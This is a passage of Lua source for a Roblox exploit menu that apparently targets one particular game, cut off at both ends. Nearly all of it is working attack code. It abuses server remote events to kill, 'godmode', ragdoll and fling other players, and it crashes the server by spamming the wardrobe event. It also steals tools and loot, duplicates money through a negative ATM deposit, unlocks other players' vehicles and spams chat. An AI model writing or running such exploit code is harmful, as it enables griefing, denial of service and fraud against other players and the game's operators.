    local toggle = section4.element('Button', 'One Punch', false, function()
        Notif:Notify("Player given One Punch", 4, "information")
        local Players = game:GetService("Players")
        local player = Players.LocalPlayer
        local realtarget = Players[crashtarget]
    

        local animationIds = {
            ["rbxassetid://14405518599"] = true,
            ["rbxassetid://14405538399"] = true
        }
    

        local function findNearbyPlayers(target)
            if not target or not target.Character or not target.Character:FindFirstChild("UpperTorso") then
                return
            end
            
            local targetPosition = target.Character.UpperTorso.Position
            for _, otherPlayer in pairs(Players:GetPlayers()) do
                if otherPlayer and otherPlayer ~= target and otherPlayer.Character and otherPlayer.Character:FindFirstChild("UpperTorso") then
                    local distance = (otherPlayer.Character.UpperTorso.Position - targetPosition).magnitude
                    if distance <= 5 then
                        local tool = target.Character:FindFirstChildOfClass("Tool")
                        if tool and tool.Script then
                            tool.Script.legma:FireServer(otherPlayer.Character.UpperTorso, otherPlayer.Character.Humanoid.Health, realtarget.Character.RightHand)
                            tool.Script.egma:FireServer(otherPlayer.Character.UpperTorso, otherPlayer.Character.Humanoid.Health, realtarget.Character.RightHand)
                        end
                    end
                end
            end
        end

        local function onAnimationPlayed(animationTrack)
            if animationIds[animationTrack.Animation.AnimationId] then
                print("Player Punched")
                findNearbyPlayers(realtarget)
            end
        end

        local function monitorAnimations(target)
            if target.Character then
                local humanoid = target.Character:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    humanoid.AnimationPlayed:Connect(onAnimationPlayed)
                end
            end
        end

        if realtarget then
            realtarget.CharacterAdded:Connect(function(character)
                monitorAnimations(realtarget)
            end)
    
            if realtarget.Character then
                monitorAnimations(realtarget)
            end
        else
            warn("Target player not found!")
        end
    end)
    
    local toggle = section4.element('Button', 'Void Player', false, function(v)
        local target = game.Players[crashtarget]
        if target then
            Notif:Notify('Found player, kicking...', 4, "information")
            wait(0.5)
        
            if not target.Character then
                Notif:Notify('Error, player has no character.', 4, "error")
                operating = false
                return
            end
        
            if not target.Character:FindFirstChild("HumanoidRootPart") then
                Notif:Notify('Error, player has no HRP.', 4, "error")
                operating = false
                return
            end
        
            local oldpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
            local car = nil
        
            for _, v in pairs(game.Workspace.SpawnedVehicles:GetChildren()) do
                if v:FindFirstChild("Owner") and v.Owner.Value == game.Players.LocalPlayer.Name then
                    car = v
                end
            end
        
            if car then
                car.DriveSeat:Sit(game.Players.LocalPlayer.Character.Humanoid)
                wait()
                
                local args = { "unlock" }
                game:GetService("ReplicatedStorage"):WaitForChild("CarRE"):InvokeServer(unpack(args))
                wait(1)
        
                if car:FindFirstChild("Wheels") then
                    car.Wheels:Destroy()
                end
        
                car:PivotTo(target.Character.HumanoidRootPart.CFrame * CFrame.new(-2, 4, -2) * CFrame.new(target.Character.Humanoid.MoveDirection * 1.2))
                wait(2)
        
                car:PivotTo(CFrame.new(587.822, -300.744, 55.821))  
                wait(0.5)
                
                game.Players.LocalPlayer.Character.Humanoid.Jump = true
                wait(0.5)
                
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
                
                local args = { "spawn", "Rusty VW" }
                game:GetService("ReplicatedStorage"):WaitForChild("CarRE"):InvokeServer(unpack(args))       
                operating = false 
            else
                Notif:Notify('Spawning VW, run again.', 4, "information")
                local args = { "spawn", "Rusty VW" }
                game:GetService("ReplicatedStorage"):WaitForChild("CarRE"):InvokeServer(unpack(args))  
                operating = false
            end
        else
            Notif:Notify('Player not found, try again.', 4, "error")
            operating = false
        end        
    end)
    
    if premium then
    local toggle = section4.element('Button', 'Godmode Player', false, function(v)
        local target = game.Players[crashtarget]
            game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.egma:FireServer(target.Character.UpperTorso, -math.huge, game.Players.LocalPlayer.Character.RightHand)
            game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.legma:FireServer(target.Character.UpperTorso, -math.huge, game.Players.LocalPlayer.Character.RightHand)
            wait(2)
            Notif:Notify("Targets Health: " .. tostring(target.Character.Humanoid.Health), 4, "information")
    end)

    local toggle = section4.element('Button', 'Godmode All', false, function(v)
        for i,v in pairs(game.Players:GetChildren()) do
            wait(0.3)
            print(v.Name)
            if v.Character then
                if v.Character:FindFirstChild("UpperTorso") then
            game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.egma:FireServer(v.Character.UpperTorso, -math.huge, game.Players.LocalPlayer.Character.RightHand)
            game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.legma:FireServer(v.Character.UpperTorso, -math.huge, game.Players.LocalPlayer.Character.RightHand)
            wait()
            game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.egma:FireServer(v.Character.UpperTorso, -math.huge, game.Players.LocalPlayer.Character.RightHand)
            game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.legma:FireServer(v.Character.UpperTorso, -math.huge, game.Players.LocalPlayer.Character.RightHand)
            wait()
            game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.egma:FireServer(v.Character.UpperTorso, -math.huge, game.Players.LocalPlayer.Character.RightHand)
            game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.legma:FireServer(v.Character.UpperTorso, -math.huge, game.Players.LocalPlayer.Character.RightHand)
            wait()
            game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.egma:FireServer(v.Character.UpperTorso, -math.huge, game.Players.LocalPlayer.Character.RightHand)
            game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.legma:FireServer(v.Character.UpperTorso, -math.huge, game.Players.LocalPlayer.Character.RightHand)
            wait()
            Notif:Notify("Attempted to godmode " .. v.Name, 4, "information")
            end
        end
        end
            Notif:Notify("Attempted to godmode all", 4, "information")
    end)
    local toggle = section4.element('Button', 'Kill all', false, function(v)
        for i,v in pairs(game.Players:GetChildren()) do
            wait(0.3)
            if v.Name ~= game.Players.LocalPlayer.Name then
                game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.egma:FireServer(v.Character.UpperTorso, v.Character.Humanoid.Health, game.Players.LocalPlayer.Character.RightHand)
                game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.legma:FireServer(v.Character.UpperTorso, v.Character.Humanoid.Health, game.Players.LocalPlayer.Character.RightHand)
            end
            end
            Notif:Notify("Attempted to kill all", 4, "information")
end)

local toggle = section4.element('Button', 'Ragdoll all', false, function(v)
    local tool = nil
    for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
        if v:FindFirstChild("Stuff") then
            tool = v
        end
        end
    if tool == nil then
        Notif:Notify("No gun in inventory", 4, "information")
    else
        for i,v in pairs(game:GetService("ReplicatedStorage").Communication.Events:GetChildren()) do
                v.Name = i
            end
            
            tool.Parent  = game.Players.LocalPlayer.Character
            wait()
            for i,v in pairs(game.Players:GetChildren()) do
                if v.Character then
                    if v.Name ~= game.Players.LocalPlayer.Name then
                        local args = {
                            [1] = tool,
                            [2] = v.Character.RightLowerLeg,
                            [3] = Vector3.new(2573.336669921875, -305.27593994140625, -161.96495056152344),
                            [4] = Vector3.yAxis,
                            [5] = Vector3.new(0.335058331489563, -0.1915476769208908, -0.9225212335586548)
                        }
                    
                        game:GetService("ReplicatedStorage"):WaitForChild("Communication"):WaitForChild("Events"):WaitForChild("3"):FireServer(unpack(args))
                        game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.egma:FireServer(v.Character.UpperTorso, -20, game.Players.LocalPlayer.Character.RightHand)
                        game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.legma:FireServer(v.Character.UpperTorso, -20, game.Players.LocalPlayer.Character.RightHand)
                    end         
            end
            end
            wait(1)
            tool.Parent = game.Players.LocalPlayer.Backpack
            Notif:Notify("Ragdolled all players", 4, "information")
            end
end)
    
local toggle = section4.element('Button', 'Crash Server', false, function(v)
    game:GetService("RunService"):Set3dRenderingEnabled(false)
    Notif:Notify("Started crashing, stay in a safezone.", 4, "information")
    game:GetService("ReplicatedStorage").WardrobeEvent:FireServer("Save", _G.scriptname .. "ONTOP")


    wait(3)
                                for i = 1, 20 do
    game:GetService("ReplicatedStorage").WardrobeEvent:FireServer("Load", _G.scriptname .. "ONTOP")
                                end
    wait(20)
    game:GetService("ReplicatedStorage").WardrobeEvent:FireServer("Save", _G.scriptname .. "ONTOP")
    
    
    wait(3)
                                for i = 1, 20 do
    game:GetService("ReplicatedStorage").WardrobeEvent:FireServer("Load", _G.scriptname .. "ONTOP")
                                end
    wait(20)
    game:GetService("ReplicatedStorage").WardrobeEvent:FireServer("Save", _G.scriptname .. "ONTOP")
    
    
    wait(3)
                                for i = 1, 20 do
    game:GetService("ReplicatedStorage").WardrobeEvent:FireServer("Load", _G.scriptname .. "wONTOP")
                                end
    wait(20)
    game:GetService("ReplicatedStorage").WardrobeEvent:FireServer("Save", _G.scriptname .. "wONTOP")
    
    
    wait(3)
                                for i = 1, 20 do
    game:GetService("ReplicatedStorage").WardrobeEvent:FireServer("Load", _G.scriptname .. "wONTOP")
                                end
    wait(20)
    game:GetService("ReplicatedStorage").Ragdoll:FireServer(true)
end)
end   

local toggle = gunsection.element('Button', 'Steal Melees', false, function(v)
    local Players = game:GetService("Players")
    local workspace = game:GetService("Workspace")


    local function findRemoteEvents()
        local remoteEvents = {}

    
        for _, tool in ipairs(workspace:GetChildren()) do
            if tool:IsA("Tool") then 
                local giveToolFolder = tool:FindFirstChild("GiveToolToPlayer")
                if giveToolFolder then
                    local giveTool = giveToolFolder:FindFirstChild("GiveTool")
                    if giveTool and giveTool:IsA("RemoteEvent") then
                        table.insert(remoteEvents, giveTool)
                    end
                end
            end
        end

     
        for _, player in ipairs(Players:GetPlayers()) do
            local character = player.Character
            if character then
                for _, tool in ipairs(character:GetChildren()) do
                    if tool:IsA("Tool") then
                        local giveToolInCharacter = tool:FindFirstChild("GiveToolToPlayer")
                        if giveToolInCharacter then
                            local giveTool = giveToolInCharacter:FindFirstChild("GiveTool")
                            if giveTool and giveTool:IsA("RemoteEvent") then
                                table.insert(remoteEvents, giveTool)
                            end
                        end
                    end
                end
            end
        end

                                
                                for _, player in ipairs(Players:GetPlayers()) do
                                    local backpack = player.Backpack
                                    if backpack then
                                        for _, tool in ipairs(backpack:GetChildren()) do
                                            if tool:IsA("Tool") then
                                                local giveToolInBackpack = tool:FindFirstChild("GiveToolToPlayer")
                                                if giveToolInBackpack then
                                                    local giveTool = giveToolInBackpack:FindFirstChild("GiveTool")
                                                    if giveTool and giveTool:IsA("RemoteEvent") then
                                                        table.insert(remoteEvents, giveTool)
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end

        return remoteEvents
    end

    local remoteEvents = findRemoteEvents()

    if #remoteEvents > 0 then
       
        local character = Players.LocalPlayer.Character
        if character and character:FindFirstChild("Humanoid") then
            for _, remoteEvent in ipairs(remoteEvents) do
                remoteEvent:FireServer(character.Humanoid)
            end
        else
            warn("LocalPlayer's character or Humanoid not found.")
        end
    else
        warn("No RemoteEvent 'GiveTool' found in workspace or players' characters.")
    end
end)
local toggle = gunsection.element('Button', 'Bug All', false, function(v)
    for i,v in pairs(game.Players:GetChildren()) do
        if v.Name ~= game.Players.LocalPlayer.Name then
        wait(0.3)
        print(v.Name)
        if v.Character then
            if v.Character:FindFirstChild("UpperTorso") then
        game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.egma:FireServer(v.Character.UpperTorso, -math.huge, game.Players.LocalPlayer.Character.RightHand)
        game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.legma:FireServer(v.Character.UpperTorso, -math.huge, game.Players.LocalPlayer.Character.RightHand)
        wait()
        game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.egma:FireServer(v.Character.UpperTorso, -math.huge, game.Players.LocalPlayer.Character.RightHand)
        game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.legma:FireServer(v.Character.UpperTorso, -math.huge, game.Players.LocalPlayer.Character.RightHand)
        wait()
        game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.egma:FireServer(v.Character.UpperTorso, -math.huge, game.Players.LocalPlayer.Character.RightHand)
        game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.legma:FireServer(v.Character.UpperTorso, -math.huge, game.Players.LocalPlayer.Character.RightHand)
        wait()
        game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.egma:FireServer(v.Character.UpperTorso, -math.huge, game.Players.LocalPlayer.Character.RightHand)
        game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.legma:FireServer(v.Character.UpperTorso, -math.huge, game.Players.LocalPlayer.Character.RightHand)
        wait(1)
        if v.Character then
            if v.Character:FindFirstChild("UpperTorso") then
        game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.egma:FireServer(v.Character.UpperTorso, math.huge, game.Players.LocalPlayer.Character.RightHand)
        game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.legma:FireServer(v.Character.UpperTorso, math.huge, game.Players.LocalPlayer.Character.RightHand)
        wait()
        game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.egma:FireServer(v.Character.UpperTorso, math.huge, game.Players.LocalPlayer.Character.RightHand)
        game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.legma:FireServer(v.Character.UpperTorso, math.huge, game.Players.LocalPlayer.Character.RightHand)
        wait()
        game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.egma:FireServer(v.Character.UpperTorso, math.huge, game.Players.LocalPlayer.Character.RightHand)
        game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.legma:FireServer(v.Character.UpperTorso, math.huge, game.Players.LocalPlayer.Character.RightHand)
        wait()
        game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.egma:FireServer(v.Character.UpperTorso, math.huge, game.Players.LocalPlayer.Character.RightHand)
        game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.legma:FireServer(v.Character.UpperTorso, math.huge, game.Players.LocalPlayer.Character.RightHand)
        wait(0.3)
        Notif:Notify("Attempted to bug " .. v.Name, 4, "information")
        end
    end
end
end
    end
end
    local tool = nil
    for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
        if v:FindFirstChild("Stuff") then
            tool = v
        end
        end
    if tool == nil then
        Notif:Notify("No gun in inventory", 4, "information")
    else
        for i,v in pairs(game:GetService("ReplicatedStorage").Communication.Events:GetChildren()) do
                v.Name = i
            end
            
            tool.Parent  = game.Players.LocalPlayer.Character
            wait()
            for i,v in pairs(game.Players:GetChildren()) do
                if v.Character then
                    if v.Name ~= game.Players.LocalPlayer.Name then
                        local args = {
                            [1] = tool,
                            [2] = v.Character.RightLowerLeg,
                            [3] = Vector3.new(2573.336669921875, -305.27593994140625, -161.96495056152344),
                            [4] = Vector3.yAxis,
                            [5] = Vector3.new(0.335058331489563, -0.1915476769208908, -0.9225212335586548)
                        }
                    
                        game:GetService("ReplicatedStorage"):WaitForChild("Communication"):WaitForChild("Events"):WaitForChild("3"):FireServer(unpack(args))
                        game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.egma:FireServer(v.Character.UpperTorso, -20, game.Players.LocalPlayer.Character.RightHand)
                        game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.legma:FireServer(v.Character.UpperTorso, -20, game.Players.LocalPlayer.Character.RightHand)
                    end         
            end
            end
            wait(1)
            tool.Parent = game.Players.LocalPlayer.Backpack
            Notif:Notify("Bugged all", 4, "information")
            end
end)

        local toggle3843774 = gunsection.element('Toggle', 'Tool Stealing', false, function(v)
        _G.ToolStealing = v.Toggle
        while _G.ToolStealing do
            game:GetService("RunService").RenderStepped:wait()
            if game.Workspace:FindFirstChildOfClass("Tool") then
                game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Workspace:FindFirstChildOfClass("Tool"))
            end
        end
            end)




            local lootstealingshit = gunsection.element('Toggle', 'Loot Stealing', false, function(v)
                _G.LootStealing = v.Toggle
                while _G.LootStealing do
                    wait(0.5)
                    for i,v in pairs(game.Players:GetChildren()) do
                        spawn(function()
                            local args = {
                                [1] = v
                            }
                            
                            game:GetService("ReplicatedStorage"):WaitForChild("LootPlayerRF"):InvokeServer(unpack(args))
                        end)
                    end
                end
                    end)

                    local lootstealingshit = gunsection.element('Toggle', 'Unlock Vehicles', false, function(v)
                        _G.Unlock = v.Toggle
                        while _G.Unlock do
                            wait(0.5)
                            for i,v in pairs(workspace.SpawnedVehicles:GetChildren()) do
                                v.DriveSeat.Disabled = false
                                    v.DriveSeat.CanTouch = true
                            end
                        end
                            end)


                    local messagespam = ""
                    local playertextbox = gunsection.element('TextBox', 'Message', nil, function(v)
                        messagespam = v.Text
                    end)
                    local lootstealingshit = gunsection.element('Toggle', 'ChatSpam', false, function(v)
                        _G.ChatSpam = v.Toggle
                        while _G.ChatSpam do
                            task.spawn(function()
                                local a = game:GetService("ReplicatedStorage").PhoneRF:InvokeServer("sendTwitterMessage", {
                                        C = messagespam
                                    })
                                    if a ~= "cooldown" then
                                        Notif:Notify("Message sent!", 4, "information")
                        end
                            end)
                        task.wait()
                        end
                            end)



                    local toggle3843774 = gunsection.element('Toggle', 'Spinbot', false, function(v)
                        local player = game.Players.LocalPlayer
                        local character = player.Character or player.CharacterAdded:Wait()
                        local humanoid = character:WaitForChild("Humanoid")
                        local spinAnimationId = "rbxassetid://11475426274"
                        local spinSpeed = 200 
                        
                        
                        local crouchAnimation = Instance.new("Animation")
                        crouchAnimation.AnimationId = spinAnimationId
                        local crouchAnimationTrack = humanoid:LoadAnimation(crouchAnimation)
                        
                       
                        _G.SpinBot = v.Toggle
                        
                        
                        
                            if _G.SpinBot then
                               
                                crouchAnimationTrack:Play()
                                while _G.SpinBot do
                                    character:SetPrimaryPartCFrame(character.PrimaryPart.CFrame * CFrame.Angles(0, math.rad(spinSpeed), 0))
                                    crouchAnimationTrack:Play()
                                    wait(0.001)
                                    crouchAnimationTrack:Stop()
                                end
                                
                            else
                               
                                crouchAnimationTrack:Play()
                                wait(crouchAnimationTrack.Length)
                                crouchAnimationTrack:Stop()
                            end
                        
                        
                    end)
                    
                    
                    
    
    
    local amount2 = 32
    local itemname = ""
    
    local toggle = sector1.element('Button', 'Duplicate', false, function(v)
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
        local safeZones = game.Workspace.SafeZones:GetChildren()
        

        local closestSafeZone = nil
        local shortestDistance = math.huge 
        
        for _, safeZone in ipairs(safeZones) do
            local distance = (humanoidRootPart.Position - safeZone.Position).Magnitude
            if distance < shortestDistance then
                shortestDistance = distance
                closestSafeZone = safeZone
            end
        end
        

        if closestSafeZone then
            humanoidRootPart.CFrame = closestSafeZone.CFrame
            character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead) 
        else
            warn("No safe zones found.")
        end        
    end)
    wait(0.1)



    for i, v in pairs(game.Players:GetChildren()) do
        if v.Character then
            local head = v.Character:FindFirstChild("Head")
            if head then
                local nameGui = head:FindFirstChild("NameGui")
                if nameGui then
                    local main = nameGui:FindFirstChild("Main")
                    if main then
                        local extras = main:FindFirstChild("Extras")
                        if extras then
                            local str = extras.Text
                            if str ~= "" then
                                Notif:Notify(v.Name .. " has an emoji: " .. str, 4, "alert")
                            end
                        end
                    end
                end
            end
        end
    end

    local operating = false

    game.Players.LocalPlayer.Chatted:Connect(function(msg)

        local function findPlayerByPartialName(partialName)
            for _, player in pairs(game.Players:GetPlayers()) do
                if string.sub(player.Name:lower(), 1, #partialName) == partialName:lower() then
                    return player
                end
            end
            return nil
        end
    

        if msg == ";fly" then
            _G.flying = true
            Notif:Notify("Started flying.", 4, "information")
            return
        elseif msg == ";unfly" then
            _G.flying = false
            Notif:Notify("Stopped flying.", 4, "information")
            return
        end
    
        if string.sub(msg, 1, 10) == ";freefall " then
            if operating then
                Notif:Notify("An operation is already in progress.", 4, "error")
                return
            end
            operating = true
    
            local partialName = string.sub(msg, 11)
            local playerToKick = findPlayerByPartialName(partialName)
            
           
            if playerToKick then
                local target = playerToKick
                Notif:Notify("Found player, freefalling...", 4, "information")
                wait(0.5)
                if not target.Character then
                    Notif:Notify("Error, player has no character.", 4, "error")
                    operating = false
                    return
                end
                if not target.Character:FindFirstChild("HumanoidRootPart") then
                    Notif:Notify("Error, player has no HRP.", 4, "error")
                    operating = false
                    return
                end
                local oldpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                local car = nil
                for i, v in pairs(game.Workspace.SpawnedVehicles:GetChildren()) do
                    if v.Owner.Value == game.Players.LocalPlayer.Name then
                        car = v
                    end
                end
    
                if car ~= nil then
                    car.DriveSeat:Sit(game.Players.LocalPlayer.Character.Humanoid)
                    wait()
                    local args = {
                        [1] = "unlock"
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("CarRE"):InvokeServer(unpack(args))
                    wait(1)
                    if car:FindFirstChild("Wheels") then
                        car.Wheels:Destroy()
                    end
                    car:PivotTo(target.Character.HumanoidRootPart.CFrame * CFrame.new(-2, 4, -2) * CFrame.new(target.Character.Humanoid.MoveDirection * 1.2))
                    wait(2)
                    car:PivotTo(CFrame.new(587.8224487304688, 12000000.74441528320312, 55.8214111328125))
                    wait(0.5)
                    game.Players.LocalPlayer.Character.Humanoid.Jump = true
                    wait(0.5)
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
                    local args = {
                        [1] = "spawn",
                        [2] = "Rusty VW"
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("CarRE"):InvokeServer(unpack(args))
                    operating = false
                else
                    Notif:Notify("Spawning VW, run again.", 4, "information")
                    local args = {
                        [1] = "spawn",
                        [2] = "Rusty VW"
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("CarRE"):InvokeServer(unpack(args))
                    operating = false
                end
            else
                Notif:Notify('Player: "' .. partialName .. '" not found, try again.', 4, "error")
                operating = false
            end   
        elseif string.sub(msg, 1, 6) == ";void " then
            if operating then
                Notif:Notify("An operation is already in progress.", 4, "error")
                return
            end
            operating = true
         
            local partialName = string.sub(msg, 7)
            local playerToKick = findPlayerByPartialName(partialName)
    
          
            if playerToKick then
                local target = playerToKick
                Notif:Notify("Found player, voiding...", 4, "information")
                wait(0.5)
                if not target.Character then
                    Notif:Notify("Error, player has no character.", 4, "error") 
                    operating = false
                    return
                end
                if not target.Character:FindFirstChild("HumanoidRootPart") then
                    Notif:Notify("Error, player has no HRP.", 4, "error") 
                    operating = false
                    return
                end
                local oldpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                local car = nil
                for i, v in pairs(game.Workspace.SpawnedVehicles:GetChildren()) do
                    if v.Owner.Value == game.Players.LocalPlayer.Name then
                        car = v
                    end
                end
    
                if car ~= nil then
                    car.DriveSeat:Sit(game.Players.LocalPlayer.Character.Humanoid)
                    wait()
                    local args = {
                        [1] = "unlock"
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("CarRE"):InvokeServer(unpack(args))
                    wait(1)
                    if car:FindFirstChild("Wheels") then
                        car.Wheels:Destroy()
                    end
                    car:PivotTo(target.Character.HumanoidRootPart.CFrame * CFrame.new(-2, 4, -2) * CFrame.new(target.Character.Humanoid.MoveDirection * 1.2))
                    wait(2)
                    car:PivotTo(CFrame.new(587.8224487304688, -300.74441528320312, 55.8214111328125))
                    wait(0.5)
                    game.Players.LocalPlayer.Character.Humanoid.Jump = true
                    wait(0.5)
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
                    local args = {
                        [1] = "spawn",
                        [2] = "Rusty VW"
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("CarRE"):InvokeServer(unpack(args))       
                    operating = false 
                else
                    Notif:Notify("Spawning VW, run again.", 4, "information")
                    local args = {
                        [1] = "spawn",
                        [2] = "Rusty VW"
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("CarRE"):InvokeServer(unpack(args))  
                    operating = false
                end
            else
                Notif:Notify('Player: "' .. partialName .. '" not found, try again.', 4, "error")
                operating = false
            end
        elseif string.sub(msg, 1, 4) == ";tp " then
            if operating then
                Notif:Notify("An operation is already in progress.", 4, "error")
                return
            end
            operating = true
          
            local partialName = string.sub(msg, 5)
            local playerToTeleport = findPlayerByPartialName(partialName)
    

            if playerToTeleport then
                local target = playerToTeleport
                Notif:Notify("Found player, teleporting...", 4, "information")
                wait(0.5)
    
                if not target.Character then
                    Notif:Notify("Error, player has no character.", 4, "error") 
                    operating = false
                    return
                end
                if not target.Character:FindFirstChild("HumanoidRootPart") then
                    Notif:Notify("Error, player has no HRP.", 4, "error") 
                    operating = false
                    return
                end
                local oldpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                local car = nil
                for i, v in pairs(game.Workspace.SpawnedVehicles:GetChildren()) do
                    if v.Owner.Value == game.Players.LocalPlayer.Name then
                        car = v
                    end
                end
    
                if car ~= nil then
                    car.DriveSeat:Sit(game.Players.LocalPlayer.Character.Humanoid)
                    wait()
                    local args = {
                        [1] = "unlock"
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("CarRE"):InvokeServer(unpack(args))
                    wait(1)
                    if car:FindFirstChild("Wheels") then
                        car.Wheels:Destroy()
                    end
                    car:PivotTo(target.Character.HumanoidRootPart.CFrame * CFrame.new(-2, 4, -2) * CFrame.new(target.Character.Humanoid.MoveDirection * 1.2))
                    wait(2)
                    car:PivotTo(oldpos)
                    wait(0.5)
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
                    local args = {
                        [1] = "spawn",
                        [2] = "Rusty VW"
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("CarRE"):InvokeServer(unpack(args))
                    operating = false
                else
                    Notif:Notify('Spawning VW, run again.', 4, "information")
                    local args = {
                        [1] = "spawn",
                        [2] = "Rusty VW"
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("CarRE"):InvokeServer(unpack(args))
                    operating = false
                end
            else
                Notif:Notify('Player: "' .. partialName .. '" not found, try again.', 4, "error")
                operating = false
            end
        elseif string.sub(msg, 1, 8) == ";deposit" then
         
            local amount = tonumber(string.sub(msg, 9))
            if amount then
                local args = {
                    [1] = "deposit",
                    [2] = amount
                }
                game:GetService("ReplicatedStorage"):WaitForChild("ATMRF"):InvokeServer(unpack(args))
                Notif:Notify('Deposited $' .. tostring(amount), 4, "information")
            else
                Notif:Notify('Invalid deposit amount.', 4, "error")
            end
        elseif string.sub(msg, 1, 5) == ";dupe" then
            local amount = tonumber(string.sub(msg, 6))
            if amount then
                local args = {
                    [1] = "deposit",
                    [2] = -1 * amount
                }
                game:GetService("ReplicatedStorage"):WaitForChild("ATMRF"):InvokeServer(unpack(args))
                Notif:Notify('Duplicated $' .. tostring(amount), 4, "information")
            else
                Notif:Notify('Invalid duplication amount.', 4, "error")
            end
        elseif string.sub(msg, 1, 9) == ";withdraw" then
           
            local amount = tonumber(string.sub(msg, 10))
            if amount then
                local args = {
                    [1] = "withdraw",
                    [2] = amount
                }
                game:GetService("ReplicatedStorage"):WaitForChild("ATMRF"):InvokeServer(unpack(args))
                Notif:Notify('Withdrew $' .. tostring(amount), 4, "information")
            else
                Notif:Notify('Invalid withdraw amount.', 4, "error")
            end
        elseif string.sub(msg, 1, 8) == ";gunkill " then
         
        
            if string.sub(msg, 9) == "all" then
                local tool = nil
                for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                    if v:FindFirstChild("Stuff") then
                        tool = v
                    end
                end
                if tool == nil then
                    Notif:Notify('No gun found in inventory.', 4, "error")
                else
                    for i, v in pairs(game:GetService("ReplicatedStorage").Communication.Events:GetChildren()) do
                        v.Name = i
                    end
                    tool.Parent = game.Players.LocalPlayer.Character
                    wait()
                    for i, v in pairs(game.Players:GetChildren()) do
                        if v.Character then
                            if v.Name ~= game.Players.LocalPlayer.Name then
                                for i = 1, 100 do
                                    local args = {
                                        [1] = tool,
                                        [2] = v.Character.HumanoidRootPart,
                                        [3] = Vector3.new(2573.336669921875, -305.27593994140625, -161.96495056152344),
                                        [4] = Vector3.yAxis,
                                        [5] = Vector3.new(0.335058331489563, -0.1915476769208908, -0.9225212335586548)
                                    }
                                    game:GetService("ReplicatedStorage"):WaitForChild("Communication"):WaitForChild("Events"):WaitForChild("3"):FireServer(unpack(args))
                                end
                            end
                        end
                    end
                    wait(3)
                    tool.Parent = game.Players.LocalPlayer.Backpack
                    Notif:Notify('Killed all players.', 4, "information")
                end
                return
            end
        
            local partialName = string.sub(msg, 9)
        
            local playerToKill = findPlayerByPartialName(partialName)
        
          
            if playerToKill then
                Notif:Notify("Player to kill: " .. playerToKill.Name, 4, "information")
                local tool = nil
                for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                    if v:FindFirstChild("Stuff") then
                        tool = v
                    end
                end
                if tool == nil then
                    Notif:Notify("No gun found in inventory.", 4, "error")
                else
                    for i, v in pairs(game:GetService("ReplicatedStorage").Communication.Events:GetChildren()) do
                        v.Name = i
                    end
                    tool.Parent = game.Players.LocalPlayer.Character
                    wait()
                    local v = playerToKill
                    for i = 1, 100 do
                        local args = {
                            [1] = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"),
                            [2] = v.Character.HumanoidRootPart,
                            [3] = Vector3.new(2573.336669921875, -305.27593994140625, -161.96495056152344),
                            [4] = Vector3.yAxis,
                            [5] = Vector3.new(0.335058331489563, -0.1915476769208908, -0.9225212335586548)
                        }
                        game:GetService("ReplicatedStorage"):WaitForChild("Communication"):WaitForChild("Events"):WaitForChild("3"):FireServer(unpack(args))
                    end
                    wait()
                    tool.Parent = game.Players.LocalPlayer.Backpack
                    Notif:Notify("Killed: " .. playerToKill.Name, 4, "information")
                end
            else
